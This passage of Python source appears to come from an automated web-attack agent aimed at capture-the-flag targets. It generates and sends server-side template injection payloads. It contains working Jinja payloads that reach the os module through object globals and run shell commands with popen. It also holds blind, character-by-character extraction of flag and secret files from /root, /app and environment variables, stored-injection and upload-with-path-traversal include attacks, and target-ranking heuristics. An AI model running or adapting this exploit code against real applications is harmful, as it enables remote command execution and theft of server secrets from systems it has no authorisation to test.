def _filtered_jinja_numeric_ord_payload(context_expr: str, index: int) -> str:
    command = _filtered_flag_char_code_command(index)
    os_expr = f"{context_expr}|attr('get')('os')"
    read_expr = f"{os_expr}|attr('popen')('{_jinja_single_quoted(command)}')|attr('read')()|int"
    return "{% print " + read_expr + " %}"


def _filtered_flag_char_code_command(index: int) -> str:
    flag_stream = (
        "(env | grep -i flag; "
        "cat /flag /FLAG flag FLAG /tmp/flag /tmp/FLAG /app/flag /app/FLAG /root/flag /root/FLAG 2>/dev/null)"
    )
    return f"{flag_stream} | head -c {index + 1} | tail -c 1 | od -An -tu1"


def _jinja_filtered_string(value: str) -> str:
    escaped_parts: list[str] = []
    for char in value:
        if char == "_":
            escaped_parts.append("\\x5f")
            continue
        if char == ".":
            escaped_parts.append("\\x2e")
            continue
        escaped_parts.append(char)
    escaped = "".join(escaped_parts)
    return "'" + escaped.replace("'", "\\'") + "'"


def _ssti_numeric_response_value(body: str) -> int | None:
    values: list[int] = []
    try:
        parsed = json.loads(body)
    except json.JSONDecodeError:
        parsed = None
    if parsed is not None:
        values.extend(_json_numeric_values(parsed))
    if not values:
        for match in re.finditer(r"[:=]\s*\"?(\d{1,3})\"?", body):
            values.append(int(match.group(1)))
    if not values:
        for match in re.finditer(r"\b(\d{1,3})\b", body):
            values.append(int(match.group(1)))
    values = [value for value in values if 0 <= value <= 255]
    for value in values:
        if 9 <= value <= 126:
            return value
    if 0 in values:
        return 0
    return values[0] if values else None


def _json_numeric_values(value: object) -> list[int]:
    values: list[int] = []
    if isinstance(value, dict):
        for item in value.values():
            values.extend(_json_numeric_values(item))
    elif isinstance(value, list):
        for item in value:
            values.extend(_json_numeric_values(item))
    elif isinstance(value, int):
        values.append(value)
    elif isinstance(value, float) and value.is_integer():
        values.append(int(value))
    elif isinstance(value, str) and re.fullmatch(r"\d{1,3}", value.strip()):
        values.append(int(value.strip()))
    return values


def _try_stored_ssti(
    session: ProbeSession,
    state: AgentState,
    targets: list[dict[str, object]],
    *,
    budget: int,
) -> tuple[dict[str, object] | None, list[dict[str, object]], int]:
    """Stored/deferred SSTI: inject via a storable field, then read it rendered elsewhere."""
    requests: list[dict[str, object]] = []
    write_targets = _storable_targets(targets)
    render_urls = _ssti_render_urls(session, state)
    if not write_targets or not render_urls:
        return None, requests, budget
    for target in write_targets[:2]:
        finding, target_requests, budget = _try_stored_ssti_target(
            session,
            target,
            render_urls=render_urls,
            budget=budget,
        )
        requests.extend(target_requests)
        if finding is not None or budget <= 0:
            return finding, requests, budget
    return None, requests, budget


def _storable_targets(targets: list[dict[str, object]]) -> list[dict[str, object]]:
    write_targets: list[dict[str, object]] = []
    for target in targets:
        if _looks_storable_target(target):
            write_targets.append(target)
    return write_targets


def _try_stored_ssti_target(
    session: ProbeSession,
    target: dict[str, object],
    *,
    render_urls: list[str],
    budget: int,
) -> tuple[dict[str, object] | None, list[dict[str, object]], int]:
    requests: list[dict[str, object]] = []
    if budget <= 0:
        return None, requests, budget

    before, snapshot_requests, budget = _snapshot_stored_render_urls(
        session,
        render_urls,
        budget=budget,
    )
    requests.extend(snapshot_requests)
    if budget <= 0:
        return None, requests, budget

    for case in _ssti_fingerprint_cases()[:4]:
        finding, case_requests, budget = _try_stored_ssti_case(
            session,
            target,
            render_urls=render_urls,
            before=before,
            case=case,
            budget=budget,
        )
        requests.extend(case_requests)
        if finding is not None or budget <= 0:
            return finding, requests, budget
    return None, requests, budget


def _snapshot_stored_render_urls(
    session: ProbeSession,
    render_urls: list[str],
    *,
    budget: int,
) -> tuple[dict[str, str], list[dict[str, object]], int]:
    before: dict[str, str] = {}
    requests: list[dict[str, object]] = []
    for url in render_urls[:6]:
        if budget <= 0:
            break
        response = session.get(url)
        budget -= 1
        before[url] = response.body
    return before, requests, budget


def _try_stored_ssti_case(
    session: ProbeSession,
    target: dict[str, object],
    *,
    render_urls: list[str],
    before: dict[str, str],
    case: dict[str, object],
    budget: int,
) -> tuple[dict[str, object] | None, list[dict[str, object]], int]:
    requests: list[dict[str, object]] = []
    if budget <= 0:
        return None, requests, budget

    payload = str(case["payload"])
    expected = _string_items(case.get("expected"))
    injection = _send_target(session, target, payload)
    budget -= 1
    requests.append(_stored_ssti_injection_request(injection, target, payload))

    finding, render_requests, budget = _check_stored_ssti_render_urls(
        session,
        target,
        render_urls=render_urls,
        before=before,
        payload=payload,
        expected=expected,
        engines=_string_items(case.get("engines")),
        budget=budget,
    )
    requests.extend(render_requests)
    return finding, requests, budget


def _stored_ssti_injection_request(
    injection: ProbeResponse,
    target: dict[str, object],
    payload: str,
) -> dict[str, object]:
    return injection.summary(body_chars=140) | {
        "target": _target_brief(target),
        "probe_kind": "ssti_stored_inject",
        "payload": payload,
    }


def _check_stored_ssti_render_urls(
    session: ProbeSession,
    target: dict[str, object],
    *,
    render_urls: list[str],
    before: dict[str, str],
    payload: str,
    expected: list[str],
    engines: list[str],
    budget: int,
) -> tuple[dict[str, object] | None, list[dict[str, object]], int]:
    requests: list[dict[str, object]] = []
    for url in render_urls[:6]:
        finding, render_requests, budget = _check_stored_ssti_render_url(
            session,
            target,
            url,
            render_urls=render_urls,
            before=before,
            payload=payload,
            expected=expected,
            engines=engines,
            budget=budget,
        )
        requests.extend(render_requests)
        if finding is not None or budget <= 0:
            return finding, requests, budget
    return None, requests, budget


def _check_stored_ssti_render_url(
    session: ProbeSession,
    target: dict[str, object],
    url: str,
    *,
    render_urls: list[str],
    before: dict[str, str],
    payload: str,
    expected: list[str],
    engines: list[str],
    budget: int,
) -> tuple[dict[str, object] | None, list[dict[str, object]], int]:
    requests: list[dict[str, object]] = []
    if budget <= 0:
        return None, requests, budget

    rendered = session.get(url)
    budget -= 1
    requests.append(_stored_ssti_render_request(rendered, url, payload))
    if not _stored_eval_signal(rendered.body, before.get(url, ""), expected, payload):
        return None, requests, budget

    finding = _stored_ssti_signal_finding(
        target,
        render_url=url,
        payload=payload,
        expected=expected,
        engines=engines,
    )
    extraction, extraction_requests, budget = _stored_ssti_extraction(
        session,
        target,
        render_urls,
        engines=engines,
        budget=budget,
    )
    requests.extend(extraction_requests)
    return extraction or finding, requests, budget


def _stored_ssti_render_request(
    rendered: ProbeResponse,
    url: str,
    payload: str,
) -> dict[str, object]:
    return rendered.summary(body_chars=220) | {
        "render_url": url,
        "probe_kind": "ssti_stored_render",
        "payload": payload,
    }


def _stored_ssti_signal_finding(
    target: dict[str, object],
    *,
    render_url: str,
    payload: str,
    expected: list[str],
    engines: list[str],
) -> dict[str, object]:
    return {
        "type": "ssti_stored_signal",
        "input": _target_brief(target),
        "render_url": render_url,
        "payload": payload,
        "expected": expected,
        "engine_candidates": engines,
        "next": (
            "Stored template evaluation confirmed; inject an engine payload and "
            "read the same render page."
        ),
    }


def _stored_ssti_extraction(
    session: ProbeSession,
    target: dict[str, object],
    render_urls: list[str],
    *,
    engines: list[str],
    budget: int,
) -> tuple[dict[str, object] | None, list[dict[str, object]], int]:
    requests: list[dict[str, object]] = []
    for payload in _ssti_extraction_payloads(engines)[:12]:
        finding, payload_requests, budget = _stored_ssti_extraction_payload(
            session,
            target,
            render_urls,
            payload=payload,
            budget=budget,
        )
        requests.extend(payload_requests)
        if finding is not None or budget <= 0:
            return finding, requests, budget
    return None, requests, budget


def _stored_ssti_extraction_payload(
    session: ProbeSession,
    target: dict[str, object],
    render_urls: list[str],
    *,
    payload: str,
    budget: int,
) -> tuple[dict[str, object] | None, list[dict[str, object]], int]:
    requests: list[dict[str, object]] = []
    if budget <= 0:
        return None, requests, budget

    injection = _send_target(session, target, payload)
    budget -= 1
    requests.append(_stored_ssti_extract_injection_request(injection, target, payload))

    proofs = recognize_proofs(injection.body)
    if proofs:
        finding = _stored_proof_finding(target, payload, proofs, injection, render_url="")
        return finding, requests, budget

    finding, render_requests, budget = _stored_ssti_extract_render_urls(
        session,
        target,
        render_urls,
        payload=payload,
        budget=budget,
    )
    requests.extend(render_requests)
    return finding, requests, budget


def _stored_ssti_extract_injection_request(
    injection: ProbeResponse,
    target: dict[str, object],
    payload: str,
) -> dict[str, object]:
    return injection.summary(body_chars=140) | {
        "target": _target_brief(target),
        "probe_kind": "ssti_stored_extract_inject",
        "payload": payload,
    }


def _stored_ssti_extract_render_urls(
    session: ProbeSession,
    target: dict[str, object],
    render_urls: list[str],
    *,
    payload: str,
    budget: int,
) -> tuple[dict[str, object] | None, list[dict[str, object]], int]:
    requests: list[dict[str, object]] = []
    for url in render_urls[:6]:
        finding, render_requests, budget = _stored_ssti_extract_render_url(
            session,
            target,
            url,
            payload=payload,
            budget=budget,
        )
        requests.extend(render_requests)
        if finding is not None or budget <= 0:
            return finding, requests, budget
    return None, requests, budget


def _stored_ssti_extract_render_url(
    session: ProbeSession,
    target: dict[str, object],
    url: str,
    *,
    payload: str,
    budget: int,
) -> tuple[dict[str, object] | None, list[dict[str, object]], int]:
    requests: list[dict[str, object]] = []
    if budget <= 0:
        return None, requests, budget

    rendered = session.get(url)
    budget -= 1
    requests.append(_stored_ssti_extract_render_request(rendered, url, payload))

    proofs = recognize_proofs(rendered.body)
    if not proofs:
        return None, requests, budget

    finding = _stored_proof_finding(target, payload, proofs, rendered, render_url=url)
    return finding, requests, budget


def _stored_ssti_extract_render_request(
    rendered: ProbeResponse,
    url: str,
    payload: str,
) -> dict[str, object]:
    return rendered.summary(body_chars=300) | {
        "render_url": url,
        "probe_kind": "ssti_stored_extract_render",
        "payload": payload,
    }


def _stored_proof_finding(
    target: dict[str, object],
    payload: str,
    proofs: list[str],
    response: ProbeResponse,
    *,
    render_url: str,
) -> dict[str, object]:
    return {
        "type": "ssti_extracted_proof",
        "input": _target_brief(target),
        "channel": "stored_deferred",
        "render_url": render_url,
        "payload": payload,
        "proofs": proofs,
        "response": response.summary(body_chars=900),
        "replay": _target_replay(target, payload),
    }


def _ssti_upload_forms(state: AgentState) -> list[dict[str, object]]:
    forms: list[dict[str, object]] = []
    for form in _form_targets(state, limit=16):
        if _form_file_input_names(form):
            forms.append(form)
    forms.sort(key=_ssti_upload_form_sort_key)
    return forms[:8]


def _ssti_upload_form_sort_key(form: dict[str, object]) -> tuple[int, str]:
    priority = -_form_priority(form)
    action = str(form.get("action") or "")
    return priority, action


def _form_file_input_names(form: dict[str, object]) -> list[str]:
    names: list[str] = []
    for input_field in _list_of_dicts(form.get("inputs")):
        name = str(input_field.get("name") or "")
        input_type = str(input_field.get("type") or "").lower()
        if name and input_type == "file":
            names.append(name)
    return _dedupe(names)


def _submit_ssti_template_upload(
    session: ProbeSession,
    form: dict[str, object],
    *,
    file_field: str,
    filename: str,
    body: bytes,
) -> ProbeResponse:
    action = str(form.get("action") or session.target_url)
    fields = form_defaults(form)
    boundary = "----RavageSSTI" + secrets.token_hex(8)
    payload = _multipart_body_for_ssti(
        boundary=boundary,
        fields=fields,
        file_field=file_field,
        filename=filename,
        content_type="text/html",
        file_body=body,
    )
    headers = _target_headers({"form": form})
    headers["Content-Type"] = f"multipart/form-data; boundary={boundary}"
    return session.request("POST", action, data=payload, headers=headers)


def _multipart_body_for_ssti(
    *,
    boundary: str,
    fields: dict[str, str],
    file_field: str,
    filename: str,
    content_type: str,
    file_body: bytes,
) -> bytes:
    chunks: list[bytes] = []
    for name, value in fields.items():
        if name == file_field:
            continue
        chunks.append(f"--{boundary}\r\n".encode("ascii"))
        chunks.append(f'Content-Disposition: form-data; name="{name}"\r\n\r\n'.encode("utf-8"))
        chunks.append(value.encode("utf-8", errors="replace") + b"\r\n")
    chunks.append(f"--{boundary}\r\n".encode("ascii"))
    chunks.append(
        (
            f'Content-Disposition: form-data; name="{file_field}"; filename="{filename}"\r\n'
            f"Content-Type: {content_type}\r\n\r\n"
        ).encode("utf-8")
    )
    chunks.append(file_body + b"\r\n")
    chunks.append(f"--{boundary}--\r\n".encode("ascii"))
    return b"".join(chunks)


def _ssti_include_targets(
    state: AgentState, targets: list[dict[str, object]]
) -> list[dict[str, object]]:
    auth_headers = _auth_headers_from_state(state)
    origin = str(state.surface.get("origin") or state.surface.get("target_url") or "").rstrip("/")
    include_targets: list[dict[str, object]] = []
    include_targets.extend(_synthetic_ssti_include_targets(origin, auth_headers))
    include_targets.extend(_existing_ssti_include_targets(targets, auth_headers))
    include_targets.extend(_endpoint_ssti_include_targets(state, auth_headers))
    return _ordered_ssti_targets(include_targets)[:12]


def _synthetic_ssti_include_targets(
    origin: str,
    auth_headers: dict[str, str],
) -> list[dict[str, object]]:
    targets: list[dict[str, object]] = []
    if not origin:
        return targets
    for path, names in _ssti_synthetic_include_paths():
        for name in names:
            targets.append(
                _ssti_include_target(
                    url=origin + path,
                    name=name,
                    hints=["template_include_common_path"],
                    priority=150 + _input_name_priority(name),
                    auth_headers=auth_headers,
                )
            )
    return targets


def _existing_ssti_include_targets(
    targets: list[dict[str, object]],
    auth_headers: dict[str, str],
) -> list[dict[str, object]]:
    include_targets: list[dict[str, object]] = []
    for target in targets:
        if _target_looks_template_include(target):
            include_targets.append(_with_default_headers(target, auth_headers))
    return include_targets


def _endpoint_ssti_include_targets(
    state: AgentState,
    auth_headers: dict[str, str],
) -> list[dict[str, object]]:
    include_targets: list[dict[str, object]] = []
    for endpoint in _surface_endpoints(state):
        include_targets.extend(_endpoint_query_ssti_include_targets(endpoint, auth_headers))
        include_targets.extend(_endpoint_heuristic_ssti_include_targets(endpoint, auth_headers))
    return include_targets


def _endpoint_query_ssti_include_targets(
    endpoint: str,
    auth_headers: dict[str, str],
) -> list[dict[str, object]]:
    targets: list[dict[str, object]] = []
    for name, _value in parse_qsl(urlsplit(endpoint).query, keep_blank_values=True):
        if not _name_looks_template_include(name, endpoint):
            continue
        targets.append(
            _ssti_include_target(
                url=endpoint,
                name=name,
                hints=["template_include_endpoint"],
                priority=90 + _input_name_priority(name),
                auth_headers=auth_headers,
            )
        )
    return targets


def _endpoint_heuristic_ssti_include_targets(
    endpoint: str,
    auth_headers: dict[str, str],
) -> list[dict[str, object]]:
    targets: list[dict[str, object]] = []
    for name in _common_param_names(endpoint):
        if not _name_looks_template_include(name, endpoint):
            continue
        targets.append(
            _ssti_include_target(
                url=endpoint,
                name=name,
                hints=["template_include_heuristic"],
                priority=45 + _input_name_priority(name),
                auth_headers=auth_headers,
            )
        )
    return targets


def _ssti_include_target(
    *,
    url: str,
    name: str,
    hints: list[str],
    priority: int,
    auth_headers: dict[str, str],
) -> dict[str, object]:
    return {
        "kind": "query_param",
        "url": url,
        "input": name,
        "hints": hints,
        "priority": priority,
        "auth_headers": auth_headers,
    }


def _ordered_ssti_targets(targets: list[dict[str, object]]) -> list[dict[str, object]]:
    deduped: dict[tuple[str, str, str], dict[str, object]] = {}
    for target in targets:
        key = _ssti_target_key(target)
        previous = deduped.get(key)
        if _ssti_target_has_higher_priority(target, previous):
            deduped[key] = target
    ordered = list(deduped.values())
    ordered.sort(key=_ssti_target_sort_key)
    return ordered


def _ssti_target_key(target: dict[str, object]) -> tuple[str, str, str]:
    kind = str(target.get("kind"))
    url = str(target.get("url"))
    input_name = str(target.get("input"))
    return kind, url, input_name


def _ssti_target_has_higher_priority(
    target: dict[str, object],
    previous: dict[str, object] | None,
) -> bool:
    if previous is None:
        return True
    return _int_value(target.get("priority")) > _int_value(previous.get("priority"))


def _ssti_target_sort_key(target: dict[str, object]) -> tuple[int, str, str]:
    priority = -_int_value(target.get("priority"))
    url = str(target.get("url"))
    input_name = str(target.get("input"))
    return priority, url, input_name


def _ssti_synthetic_include_paths() -> list[tuple[str, tuple[str, ...]]]:
    include_names = (
        "error_type",
        "template",
        "page",
        "view",
        "file",
        "path",
        "filename",
        "include",
    )
    return [
        ("/error?error_type=error.html", include_names),
        ("/error", include_names),
        ("/render", include_names),
        ("/template", include_names),
        ("/include", include_names),
        ("/preview", include_names),
        ("/view", include_names),
    ]


def _target_looks_template_include(target: dict[str, object]) -> bool:
    return _name_looks_template_include(
        str(target.get("input") or ""), str(target.get("url") or "")
    )


def _name_looks_template_include(name: str, url: str) -> bool:
    text = f"{name} {url}".lower()
    return any(
        marker in text
        for marker in (
            "template",
            "include",
            "view",
            "page",
            "file",
            "path",
            "filename",
            "error_type",
        )
    )


def _with_default_headers(target: dict[str, object], headers: dict[str, str]) -> dict[str, object]:
    if not headers or _target_headers(target):
        return target
    return dict(target) | {"auth_headers": dict(headers)}


def _ssti_include_values(filename: str) -> list[str]:
    prefixes = (
        "",
        "../images/",
        "images/",
        "../uploads/",
        "uploads/",
        "../files/",
        "files/",
        "../media/",
        "media/",
        "static/images/",
        "static/uploads/",
        "../../images/",
        "../../uploads/",
        "../../files/",
        "../../media/",
    )
    return _dedupe([prefix + filename for prefix in prefixes])


def _filename_from_include_value(value: str) -> str:
    path = urlsplit(value).path or value
    filename = path.rsplit("/", 1)[-1]
    if re.fullmatch(r"[A-Za-z0-9_.-]{3,120}", filename):
        return filename
    return ""


def _include_prefix_from_value(value: str) -> str:
    raw = str(value)
    path = urlsplit(raw).path or raw
    if "/" not in path:
        return ""
    return path.rsplit("/", 1)[0] + "/"


def _ssti_include_finding(
    form: dict[str, object],
    file_field: str,
    filename: str,
    payload: str,
    response: ProbeResponse,
    *,
    proofs: list[str],
) -> dict[str, object]:
    return {
        "type": "ssti_extracted_proof",
        "channel": "upload_include",
        "form": _form_brief_for_ssti(form),
        "file_field": file_field,
        "filename": filename,
        "payload": payload,
        "proofs": proofs,
        "response": response.summary(body_chars=900),
    }


def _form_brief_for_ssti(form: dict[str, object]) -> dict[str, object]:
    return {
        "action": str(form.get("action") or ""),
        "method": str(form.get("method") or "GET").upper(),
        "enctype": str(form.get("enctype") or ""),
        "file_fields": _form_file_input_names(form),
        "authenticated": bool(_target_headers({"form": form})),
    }


def _ssti_expression_targets(
    state: AgentState, targets: list[dict[str, object]]
) -> list[dict[str, object]]:
    expression_targets: list[dict[str, object]] = []
    auth_headers = _auth_headers_from_state(state)
    for target in targets:
        if _target_looks_expression_context(target):
            expression_targets.append(_expression_target_with_defaults(target, auth_headers))
    for endpoint in _surface_endpoints(state):
        for name, _value in parse_qsl(urlsplit(endpoint).query, keep_blank_values=True):
            if not _name_looks_expression_context(name, endpoint):
                continue
            expression_targets.append(
                _expression_query_target(
                    url=endpoint,
                    name=name,
                    hints=["expression_context_endpoint"],
                    priority=95 + _input_name_priority(name),
                    auth_headers=auth_headers,
                )
            )
        for name in _common_param_names(endpoint):
            if not _name_looks_expression_context(name, endpoint):
                continue
            expression_targets.append(
                _expression_query_target(
                    url=endpoint,
                    name=name,
                    hints=["expression_context_heuristic"],
                    priority=40 + _input_name_priority(name),
                    auth_headers=auth_headers,
                )
            )
    if _description_suggests_reminder_template_flow(state):
        for endpoint in _reminder_expression_candidate_endpoints(state):
            expression_targets.append(
                _expression_query_target(
                    url=endpoint,
                    name="date",
                    hints=["description_reminder_expression"],
                    priority=155,
                    auth_headers=auth_headers,
                )
            )
    deduped: dict[tuple[str, str, str], dict[str, object]] = {}
    for target in expression_targets:
        key = (str(target.get("kind")), str(target.get("url")), str(target.get("input")))
        previous = deduped.get(key)
        if previous is None or _int_value(target.get("priority")) > _int_value(
            previous.get("priority")
        ):
            deduped[key] = target
    ordered = list(deduped.values())
    ordered.sort(
        key=lambda item: (
            -_expression_target_score(item),
            str(item.get("url")),
            str(item.get("input")),
        )
    )
    return ordered[:16]


def _description_suggests_reminder_template_flow(state: AgentState) -> bool:
    description = str(state.surface.get("visible_description") or "").lower()
    if not description:
        return False
    return (
        _contains_any(description, ("remind", "reminder", "notify", "notification", "schedule"))
        and _contains_any(description, ("login", "log in", "authenticated", "user"))
    )


def _reminder_expression_candidate_endpoints(state: AgentState) -> list[str]:
    candidates = [
        "/remind?date=2",
        "/reminder?date=2",
        "/reminders?date=2",
        "/notify?date=2",
        "/notification?date=2",
        "/schedule?date=2",
    ]
    for endpoint in _surface_endpoints(state):
        lowered = endpoint.lower()
        if any(marker in lowered for marker in ("remind", "reminder", "notify", "schedule")):
            candidates.append(endpoint)
    return _dedupe(candidates)


def _expression_target_with_defaults(
    target: dict[str, object],
    auth_headers: dict[str, str],
) -> dict[str, object]:
    adjusted = _with_default_headers(target, auth_headers)
    if str(adjusted.get("kind") or "") != "query_param":
        return adjusted

    url = str(adjusted.get("url") or "")
    input_name = str(adjusted.get("input") or "")
    return adjusted | {"url": _expression_url_with_default_params(url, input_name)}


def _expression_query_target(
    *,
    url: str,
    name: str,
    hints: list[str],
    priority: int,
    auth_headers: dict[str, str],
) -> dict[str, object]:
    return {
        "kind": "query_param",
        "url": _expression_url_with_default_params(url, name),
        "input": name,
        "hints": hints,
        "priority": priority,
        "auth_headers": auth_headers,
    }


def _expression_url_with_default_params(url: str, input_name: str) -> str:
    if not _name_looks_expression_context(input_name, url):
        return url
    try:
        parsed = urlsplit(url)
    except ValueError:
        return url

    pairs = parse_qsl(parsed.query, keep_blank_values=True)
    existing = {name for name, _value in pairs}
    for name, value in _expression_companion_defaults(url).items():
        if name not in existing:
            pairs.append((name, value))
            existing.add(name)
    if input_name not in existing:
        pairs.append((input_name, _expression_default_for_name(input_name)))

    query = urlencode(pairs)
    return urlunsplit((parsed.scheme, parsed.netloc, parsed.path, query, parsed.fragment))


def _expression_companion_defaults(url: str) -> dict[str, str]:
    lowered = url.lower()
    if any(marker in lowered for marker in ("loan", "payment", "amort", "quote", "price", "total")):
        return {
            "principal": "2",
            "payment": "1",
            "term": "1",
        }
    return {}


def _expression_default_for_name(name: str) -> str:
    lowered = name.lower()
    if any(marker in lowered for marker in ("term", "month", "year", "duration")):
        return "1"
    if any(marker in lowered for marker in ("amount", "principal", "payment", "rate", "total")):
        return "2"
    return "2"


def _should_prioritize_ssti_expression_context(
    state: AgentState, targets: list[dict[str, object]]
) -> bool:
    if _description_suggests_reminder_template_flow(state):
        return True
    for target in _ssti_expression_targets(state, targets)[:4]:
        kind = str(target.get("kind") or "")
        url = str(target.get("url") or "")
        input_name = str(target.get("input") or "")
        if kind == "query_param" and any(
            name == input_name for name, _ in parse_qsl(urlsplit(url).query, keep_blank_values=True)
        ):
            return True
        if _target_looks_expression_context(target) and any(
            marker in url.lower()
            for marker in ("amort", "calc", "loan", "payment", "quote", "total")
        ):
            return True
    return False


def _target_looks_expression_context(target: dict[str, object]) -> bool:
    return _name_looks_expression_context(
        str(target.get("input") or ""), str(target.get("url") or "")
    )


def _expression_target_score(target: dict[str, object]) -> int:
    score = _int_value(target.get("priority"))
    kind = str(target.get("kind") or "")
    url = str(target.get("url") or "")
    input_name = str(target.get("input") or "")
    score += _expression_payload_field_bonus(input_name)
    score += _expression_endpoint_bonus(url)
    if kind == "query_param":
        score += 120
    elif kind == "heuristic_post":
        score += 30
    elif kind == "form":
        score -= 25
    if any(
        name == input_name and value
        for name, value in parse_qsl(urlsplit(url).query, keep_blank_values=True)
    ):
        score += 80
    if any(
        marker in url.lower() for marker in ("amort", "calc", "loan", "payment", "quote", "total")
    ):
        score += 45
    return score


def _expression_endpoint_bonus(url: str) -> int:
    lowered = url.lower()
    score = 0
    if any(marker in lowered for marker in ("total_", "calculate", "calculator", "compute", "quote")):
        score += 90
    if any(marker in lowered for marker in ("payment", "amount", "principal")):
        score += 35
    if any(marker in lowered for marker in ("details", "profile", "home", "account")):
        score -= 45
    if _url_looks_malformed_for_expression(url):
        score -= 200
    return score


def _url_looks_malformed_for_expression(url: str) -> bool:
    return any(marker in url for marker in ("\\n", "\n", "\r", "[", "]", '"', "'"))


def _expression_payload_field_bonus(input_name: str) -> int:
    lowered = input_name.lower()
    if "principal" in lowered:
        return 75
    if any(marker in lowered for marker in ("amount_expr", "expression", "value")):
        return 60
    if any(marker in lowered for marker in ("amount", "price", "total")):
        return 35
    if any(marker in lowered for marker in ("payment", "term", "month", "year", "duration", "rate")):
        return -20
    return 0


def _template_repetition_count(body: str) -> int:
    values = [
        int(match.group(1))
        for match in re.finditer(r"<td[^>]*>\s*(\d{1,5})\s*</td>", body, re.IGNORECASE)
    ]
    if values:
        return max(values)
    rows = len(re.findall(r"<tr\b", body, flags=re.IGNORECASE))
    if rows > 1:
        return rows - 1
    return 0


def _safe_int_expression(payload: str) -> int:
    match = re.fullmatch(r"\s*(\d{1,4})\s*([+*\-])\s*(\d{1,4})\s*", payload)
    if match is None:
        return 0
    left = int(match.group(1))
    right = int(match.group(3))
    op = match.group(2)
    if op == "+":
        return left + right
    if op == "-":
        return left - right
    return left * right


def _jinja_os_expression_candidates() -> list[str]:
    return [
        'cycler.__init__.__globals__["os"]',
        "cycler.__init__.__globals__.os",
        'joiner.__init__.__globals__["os"]',
        'namespace.__init__.__globals__["os"]',
        'lipsum.__globals__["os"]',
        'url_for.__globals__["os"]',
        "url_for.__globals__.os",
        'config.__class__.__init__.__globals__["os"]',
    ]


def _jinja_blind_payload(os_expr: str, shell_command: str) -> str:
    return f"1 if {os_expr}.popen('{_jinja_single_quoted(shell_command)}').read() else 2"


def _jinja_flag_output_expr(os_expr: str) -> str:
    return f"{os_expr}.popen('{_jinja_single_quoted(_blind_flag_stream_command())}').read()"


def _jinja_blind_python_nonempty_payload(os_expr: str, index: int) -> str:
    output_expr = _jinja_flag_output_expr(os_expr)
    return f"1 if ({output_expr})[{index}:{index + 1}] else 2"


def _jinja_blind_python_greater_payload(os_expr: str, index: int, char: str) -> str:
    output_expr = _jinja_flag_output_expr(os_expr)
    return f"1 if ({output_expr})[{index}:{index + 1}] > '{_jinja_single_quoted(char)}' else 2"


def _jinja_blind_python_equals_payload(os_expr: str, index: int, char: str) -> str:
    output_expr = _jinja_flag_output_expr(os_expr)
    return f"1 if ({output_expr})[{index}:{index + 1}] == '{_jinja_single_quoted(char)}' else 2"


def _jinja_blind_python_ord_payload(os_expr: str, index: int) -> str:
    output_expr = _jinja_flag_output_expr(os_expr)
    char_expr = f"({output_expr})[{index}:{index + 1}]"
    return f"{_jinja_builtin_from_os_expr(os_expr, 'ord')}({char_expr}) if {char_expr} else 0"


def _jinja_builtin_from_os_expr(os_expr: str, name: str) -> str:
    escaped_name = _jinja_single_quoted(name)
    if os_expr.endswith('["os"]'):
        return os_expr[: -len('["os"]')] + f'["__builtins__"]["{escaped_name}"]'
    if os_expr.endswith(".os"):
        return os_expr[: -len(".os")] + f'["__builtins__"]["{escaped_name}"]'
    return f'__builtins__["{escaped_name}"]'


def _jinja_single_quoted(value: str) -> str:
    return value.replace("\\", "\\\\").replace("'", "\\'")


def _blind_jinja_condition(
    session: ProbeSession,
    target: dict[str, object],
    payload: str,
    *,
    budget: int,
    label: str,
    true_count: int,
) -> tuple[bool, list[dict[str, object]], int]:
    if budget <= 0:
        return False, [], budget
    response = _send_target(session, target, payload)
    budget -= 1
    count = _template_repetition_count(response.body)
    return (
        count == true_count,
        [
            response.summary(body_chars=140)
            | {
                "probe_kind": label,
                "target": _target_brief(target),
                "count": count,
                "true_count": true_count,
            }
        ],
        budget,
    )


def _blind_shell_nonempty_condition(index: int) -> str:
    return (
        'sh -c "c=$('
        + _blind_flag_stream_command()
        + f' | head -c {index + 1} | tail -c 1); [ -n \\"$c\\" ] && echo 1"'
    )


def _blind_shell_char_greater_condition(index: int, char: str) -> str:
    escaped = _shell_double_quoted_char(char)
    return (
        'sh -c "c=$('
        + _blind_flag_stream_command()
        + f' | head -c {index + 1} | tail -c 1); [ \\"$c\\" \\> \\"{escaped}\\" ] && echo 1"'
    )


def _blind_shell_char_equals_condition(index: int, char: str) -> str:
    escaped = _shell_double_quoted_char(char)
    return (
        'sh -c "c=$('
        + _blind_flag_stream_command()
        + f' | head -c {index + 1} | tail -c 1); [ \\"$c\\" = \\"{escaped}\\" ] && echo 1"'
    )


def _shell_double_quoted_char(char: str) -> str:
    return char.replace("\\", "\\\\").replace('"', '\\"').replace("$", "\\$").replace("`", "\\`")


def _blind_flag_stream_command() -> str:
    return (
        "cat ./FLAG ./FLAG.txt ./flag ./flag.txt FLAG FLAG.txt flag flag.txt "
        "$HOME/FLAG $HOME/FLAG.txt $HOME/flag $HOME/flag.txt "
        "/FLAG /FLAG.txt /flag /flag.txt "
        "/tmp/FLAG /tmp/FLAG.txt /tmp/flag /tmp/flag.txt "
        "/app/FLAG /app/FLAG.txt /app/flag /app/flag.txt "
        "/var/www/html/FLAG /var/www/html/FLAG.txt /var/www/html/flag /var/www/html/flag.txt "
        "/root/FLAG /root/FLAG.txt /root/flag /root/flag.txt 2>/dev/null"
    )


def _looks_storable_target(target: dict[str, object]) -> bool:
    kind = str(target.get("kind") or "").lower()
    name = str(target.get("input") or target.get("name") or "").lower()
    if kind in {"form", "form_field", "post"}:
        return True
    return any(marker in name for marker in _STORABLE_INPUT_MARKERS)


def _ssti_render_urls(session: ProbeSession, state: AgentState) -> list[str]:
    urls: list[str] = []
    for endpoint in state.signals.get("endpoints", []):
        candidate = session.absolute(str(endpoint))
        if session.in_scope(candidate):
            urls.append(candidate)
    for path in _SSTI_RENDER_PATHS:
        candidate = session.absolute(path)
        if session.in_scope(candidate):
            urls.append(candidate)
    return _dedupe(urls)[:8]


def _stored_eval_signal(
    after_body: str, before_body: str, expected: list[str], payload: str
) -> bool:
    if payload and payload in after_body:
        return False  # literal payload reflected unrendered, not evaluated
    for value in expected:
        if value and value in after_body and value not in before_body:
            return True
    return False


def _missing_required_params(response: ProbeResponse, *, exclude: str) -> list[str]:
    if response.status not in {400, 422, 500}:
        return []
    body = response.body
    candidates: list[str] = []
    phrase = re.search(r"missing\s+([A-Za-z0-9_,\s]+?)\s+param", body, re.IGNORECASE)
    if phrase:
        for token in re.split(r"[,\s]+", phrase.group(1)):
            stripped = token.strip()
            if stripped.lower() in {"or", "and", "the", "a", "an", "is", "are"}:
                continue
            if re.fullmatch(r"[A-Za-z_][A-Za-z0-9_]{1,30}", stripped):
                candidates.append(stripped)
